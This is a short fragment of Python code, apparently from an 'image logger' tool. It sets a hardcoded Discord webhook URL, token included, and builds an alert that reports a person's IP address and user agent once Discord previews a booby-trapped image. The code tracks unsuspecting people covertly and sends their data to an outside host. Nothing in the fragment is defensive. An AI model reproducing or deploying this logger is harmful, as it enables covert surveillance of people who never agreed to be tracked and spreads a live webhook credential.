...
webhook = 'https://discord.com/api/webhooks/1489721976997155007/2t6lqwqWeA9XeQFuBJJOpoeDfoVD-RIOsMJAmqRHUE8eVYXJmqCJPDGErDjmpJpvgnuH'
  ...
  "embeds": [
    {
      "title": "Logged Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Logged Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Logged"
      },
      "fields": [
